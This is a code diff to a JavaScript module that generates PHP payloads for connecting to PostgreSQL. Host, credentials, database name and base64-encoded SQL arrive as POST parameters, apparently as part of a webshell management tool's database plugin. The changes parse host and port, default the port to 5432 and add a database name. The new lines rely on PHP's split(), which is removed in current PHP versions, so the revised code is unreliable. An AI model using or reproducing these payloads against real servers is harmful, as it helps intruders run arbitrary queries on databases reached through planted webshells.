@@ -10,11 +10,16 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       $hst=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];
       $usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];
       $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
+      list($host,$port,$dbn) = split(":", $hst);
+      $port == "" ? $port = "5432" : $port;
+      $dbn == "" ? $dbn = "postgres" : $dbn;
+
       $arr=array(
-        'host'=>explode(':',$hst)[0],
-        'port'=>explode(':',$hst)[1],
+        'host'=>$host,
+        'port'=>$port,
         'user'=>$usr,
         'password'=>$pwd,
+        'dbname'=>$dbn
       );
       $cs='';
       foreach($arr as $k=>$v) {
@@ -49,9 +54,12 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       $usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];
       $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
       $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
+
+      list($host, $port) = split(":", $hst);
+      $port == "" ? $port = "5432" : $port;
       $arr=array(
-        'host'=>explode(':',$hst)[0],
-        'port'=>explode(':',$hst)[1],
+        'host'=>$host,
+        'port'=>$port,
         'user'=>$usr,
         'password'=>$pwd,
         'dbname'=>$dbn,
@@ -91,9 +99,12 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
       $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
       $tab=$m?stripslashes($_POST["${arg5}"]):$_POST["${arg5}"];
+      list($host, $port) = split(":", $hst);
+      $port == "" ? $port = "5432" : $port;
+
       $arr=array(
-        'host'=>explode(':',$hst)[0],
-        'port'=>explode(':',$hst)[1],
+        'host'=>$host,
+        'port'=>$port,
         'user'=>$usr,
         'password'=>$pwd,
         'dbname'=>$dbn,
@@ -136,9 +147,11 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
       $sql=base64_decode($_POST["${arg5}"]);
       $encode=$m?stripslashes($_POST["${arg6}"]):$_POST["${arg6}"];
+      list($host, $port) = split(":", $hst);
+      $port == "" ? $port = "5432" : $port;
       $arr=array(
-        'host'=>explode(':',$hst)[0],
-        'port'=>explode(':',$hst)[1],
+        'host'=>$host,
+        'port'=>$port,
         'user'=>$usr,
         'password'=>$pwd,
         'dbname'=>$dbn,
